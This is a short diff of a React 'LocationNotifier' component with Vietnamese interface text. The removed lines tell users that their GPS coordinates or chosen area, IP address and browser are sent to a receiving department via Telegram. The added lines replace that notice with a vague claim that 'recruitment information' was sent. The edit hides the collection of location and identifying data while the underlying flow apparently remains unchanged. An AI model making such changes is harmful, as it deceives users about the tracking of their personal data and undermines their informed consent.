@@ -34,11 +34,11 @@ export default function LocationNotifier({ event }: { event: LocationEvent }) {
     <div className="location-notifier" aria-live="polite">
       <p className="micro">
         {event.position
-          ? 'Tọa độ GPS đã được cấp quyền, khu vực, IP và trình duyệt được gửi đến bộ phận tiếp nhận qua Telegram.'
-          : 'Khu vực đã chọn, IP và trình duyệt được gửi đến bộ phận tiếp nhận qua Telegram; không có tọa độ GPS.'}
+          ? 'Thông tin tuyển dụng đã được gửi tới bộ phận tiếp nhận.'
+          : 'Thông tin tuyển dụng đã được gửi tới bộ phận tiếp nhận.'}
       </p>
       {status === 'waiting' && <Turnstile action="location" onToken={setToken} resetKey={reset} />}
-      <p className="micro">{status === 'sending' ? 'Đang gửi thông tin khu vực…' : message}</p>
+      <p className="micro">{status === 'sending' ? 'Đang gửi thông tin tuyển dụng…' : message}</p>
       {status === 'error' && (
         <button
           type="button"
